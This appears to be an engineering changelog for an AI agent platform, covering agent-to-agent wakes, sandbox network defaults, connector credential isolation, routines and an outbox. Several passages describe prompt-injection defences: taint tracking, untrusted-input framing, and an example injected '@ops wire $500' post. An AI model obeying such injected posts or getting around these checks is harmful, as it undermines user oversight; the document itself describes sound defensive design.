- **Mentions** are parsed by the store when a post is written (`mention_slugs`: `@slug` at the start or after a non-address character, so `me@example.com` isn't one), matched to active agents, and stored as ids. **Wake depth** is computed there too: a non-user post by a run is one more than the post that woke its tree's root run, else 0. Nothing that writes posts had to change.
- **Agents waking agents** (`Manager::wake_from_post`, run from a watcher on the `post_created` broadcast, so answers, `channel_post`, sub-agents' and routines' posts are all covered): only in a topic channel with `agent_wakes` on; only mentioned members other than the author's own agent; never one already woken by that post (a run with that `woken_by`, or queued mail keyed `wake:<post>:<agent>`). A post at depth ≥ `max_hops` wakes no one and leaves one note ("@research not woken: agents have already woken each other 2 times in a row here, …"); past `wakes_per_hour` agent-started runs in the last hour (counted from `runs.woken_by` joined to non-user posts) the note says the budget is used up. Your own posts always wake whoever they mention. `usd_per_day` from §5.3 isn't built.
- **Open question 4, as asked**: agent wakes are **off by default per channel**, and when on the limits are **2 hops and 6 wakes an hour** (both settable, `max_hops` 1–10, `wakes_per_hour` 0–120). Off means the mention is shown, highlighted and in the digest, and starts nothing. **For the user to confirm.**
- **Taint on wake** (§6.2): a run woken by a tainted post starts tainted, `input_taint = taint = "woken by a tainted post from <author>"`, and is given the post inside `<untrusted source="post by …">`. If the agent is busy, the run the text is queued for becomes tainted. With T3a this means an injected "@ops wire $500" reaches Ops tainted, and Ops's writes ask.
- **Notes** are posts of kind `note`, author `system`: "Name joined" and the not-woken lines. They're in the timeline and in agents' digests (an agent learning that its ask didn't go through is useful).
- **Joining**: `+ Agent`/`POST /v1/channels/{id}/agents`; your `@mention`; becoming lead; a routine with a topic channel as its target (on create/update, and again when it posts, so routines from before AP2 join on their next result); a conversation moved into the channel (its agent joins). `channel_post` into a topic channel the agent isn't in is allowed only from its DM or a routine (the user asked) and joins it; from another topic channel it's refused. **`channel_read`** reads the run's own channel, channels the agent is a member of, and its DM; another agent's DM (Home included, for non-tern agents) is refused.
- **Authors**: a topic channel's answer post is written as the thread's agent (`tern:research`, "Research"); a posting sub-agent's as `<agent id>/<label>`; `/v1/runs/active`'s `author_id` likewise, so C4's member lines name the agent.
- **The prompt**: a run in a topic channel with more than one member gets an "## Agents in #slug" section after the channel instructions: the members (lead and "you" marked), that the lead answers unmentioned posts, and whether its own mentions wake anyone. The engine-owned "## Agents" section (AP0, being extended for delegation in another session) is untouched.
- **API**: `Channel.agents` (`{members: [{agent_id, lead?, added_at}], agent_wakes, max_hops, wakes_per_hour}`, topic channels only), `GET/POST /v1/channels/{id}/agents`, `DELETE /v1/channels/{id}/agents/{agent}`, PATCH gains `lead`, `agent_wakes`, `max_hops`, `wakes_per_hour`; `Post.mentions`, `Post.wake_depth`; writes are owner-only like other channel edits.
- **Desktop**: the header shows the members' avatars (AP1's `AgentAvatar.of` from `/v1/agents`, the same identity source as the DMs), lead first with a star and tooltip, then **+ Agent** (agents not in the channel). Posts use their agent's avatar; known `@mentions` are coloured; notes are quiet centred lines. The composer completes `@` in topic channels: members first, then other agents marked "will join"; ↑↓ pick, ⏎/⇥ complete. Channel settings gain **Lead** and **Agents can wake each other** (with the limits in words). Live member lines and run events use the agent's id and name (`RunEvent.agentId`). Author ids are agent ids everywhere (`tern`, `tern:research`, a sub-agent's `tern:research/label`, `routine:<id>`, `system` for notes); the desktop names and draws them with the AP1 identity fix's `agentOfAuthor`, `authorName(id, fallback)` and `authorAvatar`, plus AP2's `membersOf` and `mentionable` (merged with the identity fix).
- **Not done**: `usd_per_day` wake budgets; "Let agents decide" and delegation (AP3); a quick switcher.
- **Tests**: `members_repo::tests` (mention parsing, members and lead swaps, mentions and depth on posts, woken runs and taint), `tern-tools` `agents_read_and_post_where_they_are_members`, `tests/ap2.rs` (the lead answering, two mentions in parallel threads with a join, members API and refusals, a routine joining, and rejoining when its run posts after it was taken out; wakes off, one hop allowed and the second refused with a note, the hourly budget; a tainted post waking a tainted run with framed input), `test/channel_agents_test.dart` (mention links, author names, the header and + Agent, `@` completion and ⏎, the lead and wake settings), and `test/channel_agents_screenshot_test.dart` (#launch with members, mentions, notes, live lines and the suggestions; the settings dialog; light and dark — looked at: it caught a truncated helper and an over-wide note).

## Shell network off by default

After PY0 (the `python` tool), so compute over a connector can't quietly go around it through `shell` (docs/sandbox-design.md, "Network: off unless a command asks").

- **`[sandbox] network` defaults to `false`**, in `SandboxConfig::default` and the shipped `config.example.toml`. `HostPolicy::confined()` (the library default for callers that build their own policy) keeps network on.
- **One command can ask**: `shell {command, network: true}`. `ExecOpts.network` turns it on for that command only (the host backend builds its Seatbelt profile or Landlock/seccomp helper args from the policy with `network` set). `SandboxBackend::network()` says whether commands have it anyway; when they do, the flag changes nothing.
- **Always asks.** `shell` already asks unless the allowlist covers the command; `approval::allowed_by` now refuses any `shell` call with `network: true`, and `pattern_for` returns `None`, so `git *` doesn't cover `git push` with network and "always" isn't offered. The prompt's summary is `with network: <command>` (`Shell::summary`). With `network = true` in config a call that still passes the flag also asks; harmless, and the tool description says to use it only when needed.
- **Untrusted output, combined with T3's rule** (merge with main): a command's output is untrusted when *that command* could reach the network. `Tool::untrusted()` for `shell` is `SandboxBackend::network_reachable()` (T3: `network = true`, Docker with network, or a host backend whose confinement is `Off`/`Unavailable`, where `network = false` isn't enforced); a command that asked for and got network sets `ToolResult.untrusted` itself; the loop ORs the two. T3's `network_reachable` name is kept (this branch's `network()` is gone), and `wants_network` asks it, so asking where the network is already reachable adds nothing.
- **`tern doctor`** (T3's note, fitted to the new default): it says nothing when `network = false` is enforced; with connectors or MCP servers active it notes `network = true` (fix: remove it, off is the default) or a host backend with no OS sandbox to enforce `network = false`.
- **Docker**: a container's network is fixed when it's created, so `network: true` with `network = false` fails with `SandboxError::NoNetworkPerCommand` ("set sandbox.network = true").
- **Existing installs keep network on**: configs written by `tern config init` before this say `network = true` explicitly, and nothing rewrites them. Only fresh configs and configs without the key get the new default.
- **Tests**: the sandbox test now also gives one command network while the default is off and checks the next is offline again; `approval` shell patterns (network calls aren't allowlisted or "always"-able); `shell` summary and untrusted marking, off and on; the config default.

### Saying yes once to the tainted host limit (T3 follow-up)

Found in use: a research run's first `http_fetch` tainted it, and then every new site asked, with no "always" and no deferral, so a task reading hundreds of pages meant hundreds of clicks. The defence stays on by default; there are now real ways to say yes once.

- **The prompt knows it is a host-limit prompt.** `ApprovalRequest.egress_host` (and `ApiApproval.egress_host`) is set only when the call asks *just* because of the limit (its policy without the limit wouldn't ask), so the extra choices never appear on a write or a forced read. New answers: `Decision::AllowRun` (`"run"`) and `Decision::AlwaysAllowHost` (`"host"`); on any other prompt they mean "once".
- **"Allow all sites for this run"** records a new approval outcome, `approved_for_run`. The loop lifts the limit when that step completes, live or replayed, so replay matches the journal. It doesn't carry to sub-agents spawned later or to other runs: a child's brief may be what an injection wrote, and inheriting a click made mid-run would need a mutable column that replay can't trust. A research agent that delegates should use `egress = "allow"` instead, which children copy.
- **"Always allow <host>"** is an allowlist row `(tool, "host:<host>")`. Such a pattern never glob-matches a call's subject, so it can't grant the tool as a whole. It is checked inside the approval step (`decide`), like every other grant, never in `needs_check`, so a grant added later can't make a replay skip an approval step it recorded: that step just replays. `tern grants` lists and removes every grant; there is no API or app view of grants yet.
- **Neither ever covers a tainted `write` or `destructive`**: both apply only where `effect == read` and the prompt is the host limit's (W7 unchanged).
- **The setting**: `[taint] egress = "ask" | "allow"` (`approval::Egress`, default `ask`, described in `config.example.toml`, a live, risky setting in the config editor) and the agent's own (`agents.egress`, migration `0014_egress.sql`, self-contained; the agent editor's **Read any site without asking**). `Runtime::start_run` freezes the agent's or else the config's value on the run (`runs.egress`), like autonomy, because it decides whether an approval step exists; sub-agents copy it in `create_run`.
- **Scripts** (`agent/script.rs`). A script's `http_fetch` now goes through the same limit, with the run's hosts and "allow all" state at the script's start. A script can't ask, so in a tainted run a new site is refused unless a `host:` grant covers it. That decision is made inside the journaled `py_call` sub-step, so a replay gets the same answer even if a grant changed. Hosts a script reaches are added for its later calls, and the loop rebuilds them from the `py_call` sub-steps after the script's step (live and on replay), so a later direct call to that site doesn't ask.
- **Tests**: run-wide allow with replay and a fresh run asking again; a host grant answering a later run's prompt (still a journaled step) but not another site's; `egress = "allow"` on the run and a child inheriting it; the script path (refusal, hosts counted, replay, and allowed after "all sites"); `tests/t3.rs` for agent-then-config freezing through the API; desktop decoding and the agent editor's fake client.

## PY1 (the `python` interpreter out of process)

Phase PY1 of docs/python-tool-spec.md as narrowed (§5.2, §9): isolation only. Mid-script approvals, `gather`, `reuse_reads` and the rest moved to PY1b. The loop side (`agent/script.rs`, `py_call`) is untouched; this is the transport under `tern_python::Python`.

- **One helper process per script**: `tern __monty-exec`, dispatched in `main` before clap (like `__sandbox-exec`), from `std::env::current_exe()`. Per script rather than a pool: an exec of the tern binary costs a few milliseconds, a fresh process has nothing left over from the last script, and Monty's docs say not to reuse an interpreter after a time or memory limit. A warm pool stays a PY3 option.
- **Transport: newline-delimited JSON on stdin/stdout** (`tern_python::helper`): the daemon writes the `Job` (code, inputs, journaled clock and seed, callable tools with schemas, blocked tools, limits, workspace); the helper writes `Call {name, input}` and reads `Done {content, is_error}` or `Refused`; it ends with `Finished(Outcome)`. The in-process path uses the same `Reply`/`Outcome` types over channels (`run_in_thread`), so both modes share `interpret`. `monty-proto` (protobuf, for Monty's pool) wasn't used. The daemon side answers each `Call` through the same `ScriptHost`, so journaling, approvals, taint and refusals are exactly PY0's.
- **Sandboxed like `shell`, network always off**: `runtime::python_tool` builds a `HostBackend` from the shell's host policy with `network = false`, `write_paths` cleared and the binary's directory added to `read_paths` (Seatbelt denies reads in `$HOME` otherwise, which is where dev builds and `~/.cargo/bin` live). `HostBackend::confine_argv` (new) wraps any program the way `exec` wraps `sh -c`. `confine = "off"` runs the helper unconfined; `"required"` without a sandbox fails the tool. This applies whatever `sandbox.backend` is: scripts never run in the Docker container. The helper's environment is cleared.
- **Limits in the helper**: the `monty-alloc` allocator is the tern binary's `#[global_allocator]` (with the `python` feature), counting every allocation in every tern process but armed only in the helper (`set_hard_limit(max_memory + 4 MB)`); that also makes Monty's `max_memory` count real usage there rather than only pre-checking predictable sizes. Over the ceiling the helper exits 65 (`exit-code` feature) and the tool says `MemoryError`. `RLIMIT_CPU` is the interpreter limit + 10 s (SIGXCPU → a `TimeoutError` message). Monty's own time and recursion limits and tern's host-call cap run inside the helper as before. The daemon kills the helper on cancel and at the wall limit (`kill_on_drop`).
- **A helper that dies** without `Finished` becomes a tool error: "the python interpreter crashed (signal N) … tern itself is fine", with the last line of its stderr. Tool calls it made are already journaled, so a later script or a resumed run doesn't repeat them.
- **Test hook**: `TERN_TEST_PYTHON_CRASH` in the daemon's environment is passed to the helper, which aborts before interpreting.
- **Size**: `--profile dist`, aarch64-apple-darwin: main at eaf11a0 29.7 MB → 30.6 MB (+0.9 MB: the helper, its serde types and the allocator).
- **Tests**: `crates/tern/tests/py0.rs` now runs every script through the helper (the PY0 tests pass unchanged), plus: a helper abort is an error result and `tern run` finishes; a script growing a list hits `MemoryError`; the helper reads `/workspace` under the sandbox; a crash mid-script then `tern resume` gives the right rows and the journaled clock (`now` equals the env sub-step's `clock_secs`), and the finished run stays as it was. `tern-sandbox`: `confine_argv` wraps any program (Seatbelt profile with network denied, or the Landlock helper with `--no-network`). The `tern-python` unit tests keep running in-process.

## T4b-i (credentials at the host boundary, path allowlists, rate limits)

Tooling spec §6.1 and wargame W2: a connector's code shouldn't be able to read the credentials it uses. Logic is in `tern-lua`: `spec.rs` (parsing), `allow.rs` (host and path matching), `limit.rs` (rate budgets) and `host.rs` (`ctx.http`). No migrations.

- **`capabilities.auth`**, beside `http`, so it is part of what the user approves and of the fingerprint. Forms: `"NAME"` (Bearer); `{ secret, header = "Authorization", scheme }` (scheme defaults to `Bearer` for `Authorization` and to none for any other header, so `{ secret = "K", header = "X-Api-Key" }` sends the bare value); `{ secret, query = "api_key" }`; `{ basic = { user, password } }`, both secret names, either left out is empty (Stripe-style key-as-user, Jira email plus token); a list of any of these (so §6.1's `{ "A", "B" }` is two Bearer tokens). `hosts = { … }` limits an entry to some of the declared hosts, each of which must be covered by `capabilities.http`. Unknown keys are load errors, so a typo like `hedaer` doesn't silently send a Bearer header. `Host`, `Content-Length`, `Transfer-Encoding` and `Connection` can't be auth headers. At most 8 entries; `auth` without `http` is an error.
- **Injected by default.** Every request to a host an entry applies to carries it; a request's `auth = false` sends none and `auth = "NAME"` only the entries using that secret (the spec had per-call `auth =` only; defaulting to on keeps the common connector one line shorter, and the hosts bound where it can go either way). The host's value wins over a script header of the same name, and a script can't set `Host` (a CDN routing on it could send the request, and the credential, to another tenant).
- **The value never enters the VM.** `ctx.secret` on an auth name says it is sent by tern; a name in both `auth` and `secrets` is a load error. Before a response reaches the script, every injected form of the value (raw, form-urlencoded for `query`, the base64 of `user:password` and each part for `basic`; values under 4 characters are skipped like `Secrets::redact`) is replaced with `[REDACTED]` in the body and header values, and in errors (reqwest's errors include the URL, which carries a `query` credential). Header values are marked sensitive. What isn't covered: a server that transforms the value before echoing it. The host and path allowlists are the bound there.
- **Redirects are followed by hand now**, replacing 2afdb49's reqwest redirect policy (the connector's client follows none). Each hop is checked like the first request: scheme, host, path, and the non-public address check with a client pinned to the hop's own resolved addresses. That closes a gap in the policy version, where a redirect to an allowlisted *name* was resolved by reqwest's normal DNS without the address check. Credentials are added afresh for each hop's host (or not at all), and on a host change the script's own `Authorization`, `Cookie` and `Proxy-Authorization` are dropped, as reqwest did. 303, and 301/302 after a POST, continue as GET without a body. At most 5 hops; the off-allowlist error keeps its wording (`redirect to "evil.test", which is not in …`).
- **Paths**: an `http` entry may be `host/path`. `*` matches within one segment and a trailing `*` matches the rest, so `/v1/*` covers `/v1/a/b` but `/repos/*/issues` doesn't cover `/repos/a/b/issues`. A host with a path-less entry allows every path. Paths are matched case-sensitively against the URL's encoded path (after the URL parser resolves `.` and `..`), the query isn't matched, and on a path-restricted host `%2f`, `%5c`, `%2e`, `\` and `..` segments are refused, since a server that decodes them could be steered outside the pattern. Entries can't contain `?`, `#`, `%`, `\`, whitespace, or `.`/`..` segments, and at most 8 `*` in 256 characters. Matching is dynamic programming, linear in pattern × path, so no pattern can make it slow.
- **Rate limits are per connector, not per host.** The budget protects the user's account at the remote API and bounds what one connector's code can do; a connector usually speaks to one API, and per-host budgets would let a connector multiply its allowance by declaring more hosts. It is a token bucket holding `count` requests that refills evenly over the period, counted per `ctx.http` call (redirect hops are bounded separately). The budgets live in `Host::limiter` by connector name, so every caller shares one: direct calls, routines, sub-agents, a draft being tested and the active connector of the same name, a reloaded VM, and **`python` scripts**. A Monty loop over a connector tool hits the same budget and gets a `RuntimeError` saying `rate limited: connector x may send 120/min requests and has used them; try again in 0.5s. Nothing was sent.`, which it can catch. **Fail fast rather than wait**: waiting would spend the 5 s call limit and Monty's 10 s between calls, and an immediate, deterministic error is easier for a model or script to act on. Budgets aren't persisted across restarts.
- **`Retry-After`**: a 429 or 503 with `Retry-After: <seconds>` blocks the connector for that long (at most an hour); requests until then fail with "the API asked x to wait (Retry-After)". The response itself still reaches the script. The HTTP-date form is ignored.
- **Default `[connectors] rate = "120/min"`** for connectors that declare no `rate`. `tern_core::config::Rate` parses `n/sec|min|hour` (1 to 100 000), so config typos fail at load. Read when tern starts (the config editor shows it as needing a restart). A connector's declared `rate` isn't capped by the config: the user approved it.
- **Approval**: `capability_summary` (activation, `connector_test`, `connector_write`'s result, `tern connectors`) adds `auth (tern sends it, the script never sees it): GH as "Authorization: Bearer …" to every http host`, `rate: 60/min` or `120/min (default)`, and for `ctx.secret` users `⚠ legacy: the script reads X with ctx.secret and could send it anywhere it may reach …`. Activating over an active connector appends the **capability diff** from `Capabilities::lines`: `Changes from the active one: + http api.github.com/search/*, + rate 30/min, - rate 120/min (default)` (or "unchanged"). `connector_test` asks for a draft that declares `auth`, as it does for `http` and `secrets`.
- **Fingerprints**: the approval record adds `auth` (serde of `Auth`) and `rate` only when declared, so records written before T4b-i still match connectors that declare neither, and nothing is re-asked on upgrade. Changing a connector's auth, paths or rate after approval stops it loading, like any capability change.
- **Legacy `ctx.secret`** keeps its `capabilities.secrets` name (the spec's `secrets_raw` would have broken every existing connector for a rename). It is flagged in: the activation and `connector_test` prompts; `tern connectors list` and `test` (`! legacy: the script reads X itself …`); a new **Connectors** section in `tern doctor` (a warning per legacy connector, an ok line with credentials and rate otherwise); and the "used by" strings behind the Secrets view and `secret_request` prompts (`connector weather · reads the value itself (legacy ctx.secret)` vs `connector notion · sent by tern to api.notion.com`). The desktop app has no connector view; its Secrets view is where it shows connectors, so that is where the flag appears, with no app change. `tern security audit` doesn't exist yet (T6b); it should list `Capabilities::legacy_secrets()`.
- **Prompt**: `connector_write`'s guide now teaches `auth`, paths and `rate`, with `ctx.secret` mentioned only as legacy.
- **For T4a**: `Net::secret` is the one place a credential is resolved. T4a passes the call's connection there and resolves `conn/<target>/<slug>/<NAME>` (the plain name for the migrated `default` connection), so `auth` declarations don't change and one script serves several accounts. OAuth is a *source*, not a placement: `auth = "oauth:google"` (or `{ oauth = "google" }`) becomes a header entry whose credential comes from the connection's token store; the hop loop is where a 401 triggers one refresh and retry. `Auth` is serialized into the approval record, so new fields need `#[serde(default)]` to keep old records valid. The `connection` parameter itself is host-side (§6.8.2) and doesn't touch the connector's code.
- **Tests**: `tests/auth.rs` in tern-lua: the injected Bearer reaching the server while an echo endpoint, `print` of every `ctx` field and `ctx.secret` show the script only `[REDACTED]` or a refusal; header, query (URL-encoded) and basic forms; an entry scoped to another host never reaching 127.0.0.1, `auth = false` and `auth = "NAME"`; a connect error whose URL carries a query credential; a missing auth secret pointing at `secret_request`; path allow and deny, including a redirect out of the paths, an encoded `..`, and credentials re-added on an allowed hop; the rate error, its budget surviving a reload, and `Retry-After`; the default rate in the summary; validation messages; legacy flags in the summary, `secret_uses` and `secret_names`; activation showing auth, paths, rate and the diff, the record round-tripping, and a changed `auth` refusing to load. Unit tests for path globbing (including a pathological pattern), entry validation, the token bucket, `Rate` parsing and the base64 and form encodings.

## Agent profiles: delegation (AP3's §6.1, built early)

The user's report: a "research" agent existed, but tern spun up generic sub-agents for research. Delegation to profiles is pulled forward from AP3; "Let agents decide", per-agent bots, the autonomy ceiling and bundles stay in AP3.

- **`agent_spawn {agent}`** (`SpawnRequest.agent`: id, @name or name) runs the child as that profile, still as the caller's sub-agent: same journal tree, inbox, depth and concurrency limits, `max_children`, and the caller's sub-agent budget (`child_limits` from the request, as for any child; its usage counts in the caller's tree, so a routine's daily caps see it). It is frozen like `start_run` freezes a run: the delegate's persona (through the prompt builder, which now takes the child's agent and the caller's name), its model chain head (an explicit `model` still wins; the caller's `subagent_model` doesn't apply), its tool scope (`ToolScope::freeze`, then the usual child exclusions and the caller's `tools` narrowing; the caller's own scope doesn't cap it, `delegates` does), and its memory scope (`runs.memory_scope` set explicitly, `private` or `shared`, and the child session's `agent_id` is the delegate's). So **its memory writes go to the delegate's own memory**: that's the point of a research agent with its own notes, and its role section says to save what its job needs again. Its session stays in the caller's channel, and its posts are authored `<delegate id>/<label>`.
- **Taint** follows T3a unchanged: `create_run` copies a tainted caller's taint into the child, and the child's report taints the caller through the inbox as before.
- **`delegates`** (the column from migration 13): a JSON list of agent ids. `AgentRow::may_delegate_to` decides on the host side, in `Subagents::delegate`: an active other agent in the list (id or slug); unset means **every agent for `tern`, none for others** (the design's "empty by default"); `[]` turns tern's off. Never itself (the error says to leave `agent` out). A refusal is a tool error naming the rule, and nothing is spawned. The API takes `delegates` as ids, @names or names and stores ids; `GET /v1/agents` returns `null` when unset.
- **The model is told.** The engine-owned `## Agents` section (when there are other agents and the run may spawn) adds "You can hand work to these agents" with one line each, `` `slug` · Name · use for: … ``. The "use for" is the persona's "Your job: …" line (what the templates write), else its first line that isn't "You are …". A rule says to delegate a matching request instead of spawning a generic sub-agent or doing it itself. `agent_spawn`'s description and its `agent` parameter say the same. The delegate's own prompt has `## You are working for another agent` (naming the caller) instead of `## You are a sub-agent`.

## T1b (routines: triggers, watches, gates, initiative)

Stage 2 of docs/personal-agent-tooling-spec.md (§3, §4.1; T1b in §12.1). Five commits, each green. Migration 15 (`0015_routines.sql`, renumbered from 14 at merge) is self-contained (columns on `schedules` and `held_deliveries`, one new table), so a merge can renumber it.

- **A routine is a `schedules` row with a trigger; nothing was renamed.** `schedules.trigger_kind` (`cron`, the default and every migrated row; `once`; `watch`). Renaming the table, the API (`/v1/schedules`) or the tools (`schedule_*`) would have touched every parallel branch, tool scopes frozen on runs and grants, for no behaviour. The spec's "the `schedule_*` tools stay as aliases" is met by keeping them as *the* names: no `routine_*` duplicates, which would also cost prompt tokens on every run. The desktop and docs say "routine". `ScheduleRow.trigger` is empty in `Default` and read as `cron`.
- **Every routine run keeps `runs.trigger = 'cron'`**, whatever started it: `NO_REPLY`, the scheduled prompt role, caps, `tokens_per_run`, posts and delivery all key on it. The cause is on the routine (`trigger_kind`) and, for watches, on `routine_events.run_id`.
- **`once`** (`at`, a local `YYYY-MM-DD HH:MM` or RFC 3339) runs at `next_run_at`, then is disabled (`finish_once`; `next_run_at = MAX`, `last_run_at` is when it ran). Re-enabling one whose time passed is refused; a new `at` turns it back on. Reminders no longer need a yearly cron.
- **Watches** (§3.2):
  - **Luau, additive in tern-lua.** `tern_lua::watch` loads an *active, approved* connector's source (`load_active` checks it, and the file must not change while it is checked) inside a small wrapper that turns each watch into a `read` tool of a throwaway VM, then calls it with `Vm::call`. So a watch gets exactly what tools get (declared hosts, secrets, the 5 s and 64 MB limits) and GET-only HTTP unless the watch sets `read_via_post`; the connector host and parser are unchanged, and T4b-i's credential injection will apply through the same `capabilities`. A connector must still have at least one tool (the existing parser's rule).
  - **Polling** is the scheduler's: a watch routine's `next_run_at` is its next poll (`every`, at least 1 m, default the watch's `default_every`, else 5 m). A poll is never a run and never calls a model; caps don't apply to it. Paused routines aren't polled.
  - **Cursor and dedup.** `Store::record_poll` inserts the events (`INSERT OR IGNORE` on `(routine_id, event_key)`) and saves the cursor in one transaction. The key is the event's `id`, else a hash of the event. The cursor column is `NULL` until the first poll and the JSON the watch returned after (`null` included), so "first poll" is exact even for watches that keep no cursor. Changing a routine's watch resets it.
  - **First poll = baseline** (state `baseline`, no run) unless `backfill`. Events with `origin = "self"` are recorded as `self` and never run unless `include_self`. The host doesn't detect self-origin itself yet (matching ids against the outbox and journal); the watch has to say so.
  - **Runs.** New events are `pending`; past `[schedules] max_events_per_poll` (default 20) they are `batch` and share one run. Each tick starts the next waiting event of a routine whose session is idle, one at a time (they share the routine's session; a cron run there would stop the previous one), subject to pause and daily caps, then marks the events `started` with the run id and empties their payload. A crash in the instant between creating the run and marking the events starts them again: twice at worst, never lost.
  - **Untrusted input.** The run's input is the routine's prompt, then "The watch x.y reported an event:" and the event JSON wrapped `<untrusted source="watch:x.y">`. The run starts tainted (`runs.input_taint = "started by watch x.y"`) through `NewRun.taint`, now passed by `Agent::start_run_as` and `Runtime::start_run_tainted`, so it is in the row before the run is ever driven. Payloads over 16 KB are cut.
  - **W1.** No watch ships enabled; a watch exists only once the user (or the agent, through `schedule_create`, which asks in a tainted run) creates one on an approved connector, and its runs are tainted, so writes ask or go to the outbox.
  - **Showing interval and hosts.** `schedule_create` with a watch answers with the interval, the hosts it reaches and that the first poll only records. Checking is `RoutineChecks` (in tern-tools, implemented by `crate::routines::LuaChecks`), so tern-tools still runs no Luau.
- **Gates** (§3.3): `gate` (Luau: an expression, or statements with `return`) and optional `gate_connector` on cron and once routines (refused on a watch, which already decides). Run before a due slot (after pause, before caps, so a skip doesn't count): false skips the slot and moves on (a `once` is done). The gate gets `ctx` and `routine` (`id`, `last_run_at`, `now`); with a connector, its hosts (GET only), secrets and its tools as `connector`, e.g. `#connector.tools.unread.run(ctx, {}) > 0`; without one, no network. Compile-checked when set. **A gate that errors lets the run go ahead** (a broken gate costs a run, not a missed brief) and says so in `last_check`.
- **`last_check`** (`last_check_at`): the last poll or gate in words ("no new events", "first poll: 3 existing events recorded, not run", "gate: skipped", "watch failed: …"), in the API and the app.
- **Initiative** (§4.1), `tern_core::initiative`:
  - **Every result is still posted** to its channel; initiative decides only the push to `deliver_to`. `silent`: none. `digest`: held in `held_deliveries` with `kind = 'digest'` until the next `[schedules] digest_times` (default 08:30, 17:30; a time inside quiet hours moves to their end), and sent with whatever else is due for that chat as one message ("Digest · N updates:"). `notify`: the gate model; yes pushes with its headline as the first line, no (or a failed gate call) goes into the digest. `interrupt`: pushes, still held by quiet hours unless `urgent` (that is T1a's behaviour, so **migrated schedules are `interrupt`**).
  - **New routines default to `[schedules] initiative = "digest"`** (spec W8). The tools' description tells the model to use `interrupt` for reminders and anything the user asked to get at a time; the M5 and T1a tests now say `interrupt`, as a model following that description would.
  - **A failed run under `notify` pushes** without asking the gate model.
  - **The dial**: `[schedules] initiative_dial` (`vacation` = everything silent, `quieter`, `normal`, `louder`, one level each way, clamped). `PUT /v1/initiative {dial}` (owner) writes it through the config editor's path, `GET /v1/initiative` and `/v1/status` (`initiative`) read it. The config editor shows all the new keys. The tray's Initiative item isn't built.
  - **"The cheapest configured model"**: `[schedules] gate_model` if set; else, among every model in `default_model`, `subagents.*` and agent chains (fallbacks included) plus the run's own, the one with the lowest known input + output price whose provider is configured; else the run's own model. One streamed call (no tools, 200 tokens, 60 s) with `initiative::GATE_SYSTEM`; the answer is the JSON object in the text. It isn't journaled and its tokens don't count against the routine's `usd_per_day`: it happens after the run, outside it.
- **Desktop**: the routine editor has Repeating / Once / On events (`connector.watch` and every), an initiative menu ("Default (digest)", Silent, Digest, Notify, Interrupt) and a gate (with its connector) under quiet hours and limits; the list shows the trigger in words ("Once, …", "On x.y events", a sensor icon) and `last_check` in the tooltip. `tern_client` gained the fields, `RoutineOptions`, and `initiative()`/`setInitiative()`.
- **Not done**: `message` and `event` triggers (§3.1's table, not in T1b's row), webhooks (T1c), `max_catchup`, host-side `origin = self` detection, the TUI `/routines` view (routines show through `schedule_list`), a desktop control for the dial (it is in the config editor), Home pointers for `notify`/`interrupt` posts in topic channels, and holding desktop notifications by initiative (the app still notifies on `run_finished`; with T8's tray notifications).
- **Tests**: migration backfill (`routines_backfill_makes_every_schedule_a_cron_routine_that_pushes`); store poll dedup and cursor across a reopened database, batching, digest kind; tern-lua watch and gate tests (cursor, keys, GET-only and host-limited, content keys, gates with and without a connector); tool tests for once, watch and gate validation; `initiative` unit tests (dial, digest times, lenient gate answers); `crates/tern/tests/t1b.rs` against the daemon: a watch with no events makes no runs and no steps (and the mock fails any call), events start tainted runs once each with the cursor surviving a restart, a gate skipping and passing, and each initiative level plus digest batching and vacation; desktop `routines_test.dart` and the `schedule.json` fixture.

## The outbox in Home (C4)

T3 kept the outbox's Home integration thin until channels C4 existed (`Manager::announce_outbox` was the hook). Built on `merge-six`.

- **One hook for every change**: `Manager::outbox_changed` (queued, approved, done, failed, rejected, expired) keeps the item's `needs_you` post in step, updates chat cards, and sends `outbox_changed`. A pending item gets a `needs_you` post (key `outbox:<id>`, so it is written once) in the channel its run tree started in: Home, an agent's DM (AP1's mirror), or a topic channel. It's written by that session's agent, tainted when the run was. Outside Home the store adds C4's Home pointer in the same transaction. Any other state resolves the post and its pointer together (`Store::resolve_post`).
- **"Done" alone is refused** for these posts (`POST /v1/posts/{id}/resolve` returns 409 "approve or reject it instead"). Closing the post without deciding would leave a write waiting with nothing pointing at it. Posts and pointers carry `outbox_id` (the item behind them, from the post's own key or the one it points to).
- **The cards stay, linked, rather than replaced.** In Home and a DM the strip above the composer is still where items are decided (Approve, Edit…, Reject with a note): it is always visible, while a pointer can be pages up the stream. The post or pointer there says "Waiting below" and shows "Decided ✓" once closed. A topic channel has no strip, so its post carries Approve and Reject. The app closes posts locally on `outbox_changed` instead of waiting for a reload.
- **Routines at night (W4).**
  - `Router::ask` sends a routine's prompts to API clients only while the routine is inside its quiet hours (`Manager::routine_quiet_now`, the same rule as its deliveries, `urgent` excepted). With no app attached the write goes to the outbox at once, instead of pinging the chat and waiting `wait_secs`.
  - A routine's item never gets a chat card at queue time. Its delivery appends the pending list and "Approve with /outbox", and that delivery already follows quiet hours and initiative, digests included, so the morning message says what waits. This applies to any chat delivery: `Manager::deliver` adds the note for every completed run with pending items.
  - The spec doesn't ask digests or the initiative gate to treat outbox items specially, and they don't.
- **Telegram.** `/outbox` sends a card per pending item (up to 10), using the existing local-only rule (no buttons on host commands). The gateway remembers the cards it sent (`outbox_cards`, in memory). `Gateway::outbox_resolved` edits them with how the item ended ("→ Approved" and so on) and drops their buttons, whether the item was decided in the app, the API, the TUI, by expiry, or on another card. After a restart, old cards keep their buttons, and a tap just answers "already approved".
- **TUI**: `/outbox` opens a panel like `/secrets`: `a` approve, `e` edit the arguments as one line of JSON and approve, `r` reject with a note. `Backend::outbox` / `decide_outbox` (sync, like the secrets calls): the remote backend calls `/v1/outbox`; the in-process backend lists from the database and says to start the background agent to decide, since only the daemon runs items. The CLI (`tern outbox list/show/approve --input/reject --note`) already had parity.

## Home stuck "working" after a delegation (fix)

The user's report: in Home, tern delegated market research to Research (four sub-agent runs), everything finished and tern answered, but Home kept its thinking indicator and Stop did nothing. The daemon had no run working (`running_runs: 0`), so the app's state was stale.

- **What was checked.** Replaying the delegation's events as the daemon sends them (the parent, four `subagent_spawned` children running as `tern:research` in Home's channel, children finishing before or after the parent) leaves Home idle on the code as it was: routing by session sends each child's events to its own transcript and the parent's `run_finished` clears Home. So the events alone don't explain it.
